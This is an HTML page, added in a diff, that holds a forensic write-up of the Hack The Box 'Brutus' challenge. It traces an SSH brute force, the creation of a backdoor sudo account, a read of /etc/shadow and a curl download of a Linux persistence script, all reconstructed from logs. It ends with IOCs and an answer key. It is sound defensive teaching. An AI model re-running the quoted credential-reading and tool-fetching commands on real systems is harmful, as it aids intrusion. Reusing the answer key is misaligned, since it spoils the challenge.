@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brutus — HTB Writeup</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="stylesheet" href="/inter-font.css">
+    <link rel="stylesheet" href="/fontawesome.css">
+    <link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+
+    <nav class="nav">
+        <a href="/htb/" class="nav-back"><i class="fas fa-arrow-left"></i> Writeups</a>
+        <span class="nav-title">Brutus</span>
+        <span></span>
+    </nav>
+
+    <div class="writeup-page" id="page" style="display:none">
+
+        <header class="writeup-header">
+            <div class="wh-meta">
+                <span class="wr-tag challenge">Sherlock</span>
+                <span class="wr-tag easy">Very Easy</span>
+            </div>
+            <h1 class="wh-title">Brutus</h1>
+            <p class="wh-summary">DFIR investigation of a compromised Confluence server. Reconstruct an SSH brute-force, credential theft, and backdoor account creation from <code>auth.log</code> and <code>wtmp</code>.</p>
+        </header>
+
+        <article class="writeup-body">
+
+            <section class="wb-section">
+                <h2>Scenario</h2>
+                <p>A Confluence server was compromised. We're handed two host-based authentication artifacts from the affected Ubuntu box and asked to reconstruct the intrusion: how the attacker got in, what account they used, how they established persistence, and what they did with their access.</p>
+                <ul>
+                    <li><strong><code>auth.log</code></strong> — plaintext PAM/sshd log; records SSH login attempts (success and failure), account/group changes, and <code>sudo</code> execution.</li>
+                    <li><strong><code>wtmp</code></strong> — binary accounting file recording login/logout sessions (who, from where, which TTY, and when). Parsed with the provided <code>utmp.py</code>.</li>
+                </ul>
+                <p>Used together: <code>auth.log</code> tells you <em>what authentication events happened</em>; <code>wtmp</code> confirms <em>which became real interactive sessions and how long they lasted</em>.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>1. Establish a Baseline</h2>
+                <p>Reading the head of <code>auth.log</code>, the host is <code>ip-172-31-35-28</code> (an AWS EC2 instance) running cron jobs as a <code>confluence</code> service account. Legitimate administrative access comes from <code>203.101.190.9</code> — confirmed by an <code>Accepted password for root</code> at <code>06:19:54</code>. This is the known-good admin IP.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>2. Identify the Brute Force</h2>
+                <p>Filtering for failed authentications surfaces a flood of attempts from a single source:</p>
+                <pre><code>grep "Failed password" auth.log</code></pre>
+                <pre><code>Mar  6 06:31:33 ... Failed password for invalid user admin from 65.2.161.68 ...
+Mar  6 06:31:33 ... Failed password for backup from 65.2.161.68 ...
+Mar  6 06:31:37 ... Failed password for invalid user server_adm from 65.2.161.68 ...
+Mar  6 06:31:38 ... Failed password for invalid user svc_account from 65.2.161.68 ...</code></pre>
+                <p>Dozens of failures within a couple of seconds, cycling through usernames from <strong><code>65.2.161.68</code></strong>. Rapid timestamps and rotating usernames are the tell of an automated credential-stuffing burst.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>3. Find the Successful Compromise</h2>
+                <pre><code>grep "Accepted password" auth.log</code></pre>
+                <pre><code>Mar  6 06:19:54 ... Accepted password for root from 203.101.190.9 port 42825   # legit admin
+Mar  6 06:31:40 ... Accepted password for root from 65.2.161.68  port 34782    # brute force succeeds
+Mar  6 06:32:44 ... Accepted password for root from 65.2.161.68  port 53184
+Mar  6 06:37:34 ... Accepted password for cyberjunkie from 65.2.161.68 port 43260</code></pre>
+                <p>The brute force succeeds against <strong><code>root</code></strong> at <code>06:31:40</code> — just seven seconds after the burst began. A second root login follows at <code>06:32:44</code>, and later a login as <code>cyberjunkie</code> (a previously unseen user) appears — the first sign of persistence.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>4. Correlate Sessions in wtmp</h2>
+                <pre><code>python3 utmp.py wtmp</code></pre>
+                <p>Relevant records for the attacker IP:</p>
+                <table class="wb-table">
+                    <thead>
+                        <tr><th>TTY</th><th>User</th><th>Host</th><th>Time</th><th>Notes</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>pts/1</td><td>root</td><td>65.2.161.68</td><td>2024/03/06 06:32:45</td><td>Interactive attacker session</td></tr>
+                        <tr><td>pts/1</td><td>(DEAD)</td><td>—</td><td>2024/03/06 06:37:24</td><td>Session ends</td></tr>
+                        <tr><td>pts/1</td><td>cyberjunkie</td><td>65.2.161.68</td><td>2024/03/06 06:37:35</td><td>Backdoor account logs in</td></tr>
+                    </tbody>
+                </table>
+                <p>The root session on <code>pts/1</code> (<code>06:32:45</code> → <code>06:37:24</code>) is the hands-on-keyboard window. Duration: <strong>4 minutes 39 seconds</strong>.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>5. Tie Sessions to systemd Session Numbers</h2>
+                <pre><code>grep "New session" auth.log</code></pre>
+                <pre><code>New session 34 of user root.          # 06:31:40 - first brute-force hit
+New session 37 of user root.          # 06:32:44 - the interactive session
+New session 49 of user cyberjunkie.   # 06:37:34</code></pre>
+                <p>Session <strong>37</strong> is the interactive root session aligned with the wtmp <code>pts/1</code> record and immediately preceding the account-creation activity.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>6. Reconstruct Persistence and Post-Exploitation</h2>
+                <pre><code>grep -E "useradd|new user|new group|usermod|passwd" auth.log
+grep -E "sudo:.*COMMAND" auth.log</code></pre>
+                <pre><code>06:34:18  groupadd    new group: name=cyberjunkie, GID=1002
+06:34:18  useradd     new user: name=cyberjunkie, UID=1002, shell=/bin/bash, from=/dev/pts/1
+06:34:26  passwd      password changed for cyberjunkie
+06:35:15  usermod     add 'cyberjunkie' to group 'sudo'
+06:37:57  sudo        cyberjunkie : COMMAND=/usr/bin/cat /etc/shadow
+06:39:38  sudo        cyberjunkie : COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></pre>
+                <p>The attacker created a backdoor account <code>cyberjunkie</code>, gave it a password, and escalated it into the <code>sudo</code> group — establishing durable, privileged access that survives even if the root password is rotated. They then dumped <code>/etc/shadow</code> (credential access) and fetched <strong><code>linper.sh</code></strong> — a public Linux persistence/privilege-escalation toolkit.</p>
+            </section>
+
+            <section class="wb-section">
+                <h2>Attack Timeline (2024-03-06 UTC)</h2>
+                <table class="wb-table">
+                    <thead>
+                        <tr><th>Time</th><th>Event</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>06:31:33</td><td>SSH brute force begins from <code>65.2.161.68</code> (rotating usernames)</td></tr>
+                        <tr><td>06:31:40</td><td>Brute force succeeds — <code>Accepted password for root</code> (session 34)</td></tr>
+                        <tr><td>06:32:44</td><td>Attacker re-logs in as root (session 37, wtmp pts/1)</td></tr>
+                        <tr><td>06:34:18</td><td>Backdoor account <code>cyberjunkie</code> created (group + user)</td></tr>
+                        <tr><td>06:34:26</td><td>Password set for <code>cyberjunkie</code></td></tr>
+                        <tr><td>06:35:15</td><td><code>cyberjunkie</code> added to <code>sudo</code> group</td></tr>
+                        <tr><td>06:37:24</td><td>Root session on pts/1 ends (duration 4m 39s)</td></tr>
+                        <tr><td>06:37:34</td><td>Attacker logs in as <code>cyberjunkie</code> (session 49)</td></tr>
+                        <tr><td>06:37:57</td><td><code>sudo cat /etc/shadow</code> — credential dumping</td></tr>
+                        <tr><td>06:39:38</td><td><code>sudo curl …/linper.sh</code> — downloads persistence script</td></tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <section class="wb-section">
+                <h2>MITRE ATT&amp;CK Mapping</h2>
+                <table class="wb-table">
+                    <thead>
+                        <tr><th>Tactic</th><th>Technique</th><th>ID</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>Credential Access</td><td>Brute Force</td><td>T1110</td></tr>
+                        <tr><td>Persistence</td><td>Create Account: Local Account</td><td>T1136.001</td></tr>
+                        <tr><td>Privilege Escalation</td><td>Valid Accounts / sudo group abuse</td><td>T1078 / T1548</td></tr>
+                        <tr><td>Credential Access</td><td>OS Credential Dumping (<code>/etc/shadow</code>)</td><td>T1003.008</td></tr>
+                        <tr><td>C2 / Ingress</td><td>Ingress Tool Transfer (<code>curl linper.sh</code>)</td><td>T1105</td></tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <section class="wb-section">
+                <h2>Indicators of Compromise</h2>
+                <ul>
+                    <li><strong>Source IP:</strong> <code>65.2.161.68</code></li>
+                    <li><strong>Rogue account:</strong> <code>cyberjunkie</code> (UID 1002, GID 1002, added to <code>sudo</code>)</li>
+                    <li><strong>Malicious download:</strong> <code>https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></li>
+                    <li><strong>Compromised account:</strong> <code>root</code></li>
+                </ul>
+            </section>
+
+            <section class="wb-section">
+                <h2>Answer Key</h2>
+                <table class="wb-table">
+                    <thead>
+                        <tr><th>#</th><th>Question</th><th>Answer</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>1</td><td>Attacker's source IP</td><td><code>65.2.161.68</code></td></tr>
+                        <tr><td>2</td><td>Account compromised via brute force</td><td><code>root</code></td></tr>
+                        <tr><td>3</td><td>Source port of the successful login</td><td><code>34782</code></td></tr>
+                        <tr><td>4</td><td>systemd session number of the attacker's root session</td><td><code>37</code></td></tr>
+                        <tr><td>5</td><td>Backdoor account created for persistence</td><td><code>cyberjunkie</code></td></tr>
+                        <tr><td>6</td><td>MITRE ATT&amp;CK technique for the persistence</td><td><code>T1136.001</code></td></tr>
+                        <tr><td>7</td><td>Attacker root session duration</td><td><code>00:04:39</code></td></tr>
+                        <tr><td>8</td><td>First command run with elevated privileges</td><td><code>/usr/bin/cat /etc/shadow</code></td></tr>
+                        <tr><td>9</td><td>Full sudo command used to download the script</td><td><code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></td></tr>
+                    </tbody>
+                </table>
+            </section>
+
+        </article>
+    </div>
+
+    <script>
+    const SESSION_KEY = 'htb_auth';
+    if (!sessionStorage.getItem(SESSION_KEY)) {
+        window.location.href = '/htb/';
+    } else {
+        document.getElementById('page').style.display = 'block';
+    }
+    </script>
+
+</body>
+</html>
